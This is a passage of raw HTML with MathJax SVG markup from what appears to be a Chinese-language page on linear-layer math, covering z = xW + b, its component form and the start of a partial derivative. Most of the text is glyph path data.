width=\"19.784ex\" height=\"2.099ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -846 8744.4 928\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(742.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1798.6,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2370.6,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3640.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4641,0)\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5347.8,0)\"><path data-c=\"2208\" d=\"M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z\"/></g><g data-mml-node=\"msup\" transform=\"translate(6292.6,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"211D\" d=\"M17 665Q17 672 28 683H221Q415 681 439 677Q461 673 481 667T516 654T544 639T566 623T584 607T597 592T607 578T614 565T618 554L621 548Q626 530 626 497Q626 447 613 419Q578 348 473 326L455 321Q462 310 473 292T517 226T578 141T637 72T686 35Q705 30 705 16Q705 7 693 -1H510Q503 6 404 159L306 310H268V183Q270 67 271 59Q274 42 291 38Q295 37 319 35Q344 35 353 28Q362 17 353 3L346 -1H28Q16 5 16 16Q16 35 55 35Q96 38 101 52Q106 60 106 341T101 632Q95 645 55 648Q17 648 17 665ZM241 35Q238 42 237 45T235 78T233 163T233 337V621L237 635L244 648H133Q136 641 137 638T139 603T141 517T141 341Q141 131 140 89T134 37Q133 36 133 35H241ZM457 496Q457 540 449 570T425 615T400 634T377 643Q374 643 339 648Q300 648 281 635Q271 628 270 610T268 481V346H284Q327 346 375 352Q421 364 439 392T457 496ZM492 537T492 496T488 427T478 389T469 371T464 361Q464 360 465 360Q469 360 497 370Q593 400 593 495Q593 592 477 630L457 637L461 626Q474 611 488 561Q492 537 492 496ZM464 243Q411 317 410 317Q404 317 401 315Q384 315 370 312H346L526 35H619L606 50Q553 109 464 243Z\"/></g></g><g data-mml-node=\"TeXAtom\" transform=\"translate(755,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"D7\" d=\"M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1278,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g></svg></mjx-container></span></p></li>\n</ul>\n<p>写成分量形式： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.819ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"32.661ex\" height=\"6.74ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1733 14436.4 2978.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1117.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"munderover\" transform=\"translate(2172.9,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(148.2,-1087.9) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(345,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1123,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(429.3,1150) scale(0.707)\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(3783.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(4682.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(345,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(623,0)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><g data-mml-node=\"mo\" transform=\"translate(6663.6,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(7663.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44F\" d=\"M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(462,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(8467.1,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8911.8,0)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9601.6,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(10657.4,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(11157.4,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(11602,0)\"><path data-c=\"2026\" d=\"M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12940.7,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(13385.4,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></svg></mjx-container></span> 所以： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.909ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.306ex\" height=\"5.233ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1469.2 4997.4 2313\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(249.8,754.2)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g><rect width=\"1665\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" 